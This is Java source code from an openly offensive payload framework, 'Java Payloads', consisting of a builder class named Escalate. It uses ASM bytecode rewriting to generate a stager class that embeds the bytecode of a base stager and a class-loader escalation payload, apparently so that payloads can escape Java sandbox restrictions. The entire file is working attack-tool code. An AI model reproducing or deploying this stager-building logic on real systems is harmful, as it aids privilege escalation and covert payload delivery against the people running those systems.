/*
 * Java Payloads.
 * 
 * Copyright (c) 2012 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.builder.dynstager;

import java.io.ByteArrayOutputStream;

import javapayload.builder.ClassBuilder;
import javapayload.escalate.EscalateBasics;
import javapayload.escalate.EscalateCreateClassLoaderPayload;
import javapayload.stage.StreamForwarder;
import javapayload.stager.Stager;

import org.objectweb.asm.ClassAdapter;
import org.objectweb.asm.ClassVisitor;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.MethodAdapter;
import org.objectweb.asm.MethodVisitor;

public class Escalate extends DynStagerBuilder {
	public byte[] buildStager(String stagerResultName, Class baseStagerClass, String extraArg, String[] args) throws Exception {
		if (extraArg != null)
			throw new IllegalArgumentException("Spawn stagers do not support an extra argument");
		String stagerFullName = baseStagerClass.getName();
		final String stagerName = stagerFullName.substring(stagerFullName.lastIndexOf('.') + 1);
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		StreamForwarder.forward(Stager.class.getResourceAsStream("/" + Stager.class.getName().replace('.', '/') + ".class"), baos);
		final String stagerClassContent = new String(baos.toByteArray(), "ISO-8859-1");
		baos.reset();
		StreamForwarder.forward(baseStagerClass.getResourceAsStream("/" + baseStagerClass.getName().replace('.', '/') + ".class"), baos);
		final String baseStagerContent = new String(baos.toByteArray(), "ISO-8859-1");
		baos.reset();
		StreamForwarder.forward(EscalateCreateClassLoaderPayload.class.getResourceAsStream("/" + EscalateCreateClassLoaderPayload.class.getName().replace('.', '/') + ".class"), baos);
		final String createClassLoaderPayloadContent = new String(baos.toByteArray(), "ISO-8859-1");
		final ClassWriter cw = new ClassWriter(0);
		final ClassVisitor templateVisitor = new ClassAdapter(cw) {
			public void visit(int version, int access, String name, String signature, String superName, String[] interfaces) {
				super.visit(version, access, "javapayload/stager/Escalate_" + stagerName, signature, superName, interfaces);
			}

			public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions) {
				return new MethodAdapter(super.visitMethod(access, name, desc, signature, exceptions)) {
					private String cleanType(String type) {
						if (type.equals("javapayload/escalate/EscalateBasics")) {
							type = "javapayload/stager/Escalate_" + stagerName;
						}
						return type;
					}

					public void visitFieldInsn(int opcode, String owner, String name, String desc) {
						super.visitFieldInsn(opcode, cleanType(owner), name, desc);
					}

					public void visitMethodInsn(int opcode, String owner, String name, String desc) {
						super.visitMethodInsn(opcode, cleanType(owner), name, desc);
					}

					public void visitTypeInsn(int opcode, String type) {
						super.visitTypeInsn(opcode, cleanType(type));
					}

					public void visitLdcInsn(Object cst) {
						if ("STAGER_CLASS".equals(cst))
							visitStringConstant(mv, stagerClassContent);
						else if ("BASE_STAGER".equals(cst))
							visitStringConstant(mv, baseStagerContent);
						else if ("CREATE_CLASS_LOADER_PAYLOAD".equals(cst))
							visitStringConstant(mv, createClassLoaderPayloadContent);
						else
							super.visitLdcInsn(cst);
					}
				};
			}
		};
		ClassBuilder.visitClass(EscalateBasics.class, templateVisitor, cw);
		return cw.toByteArray();
	}
}
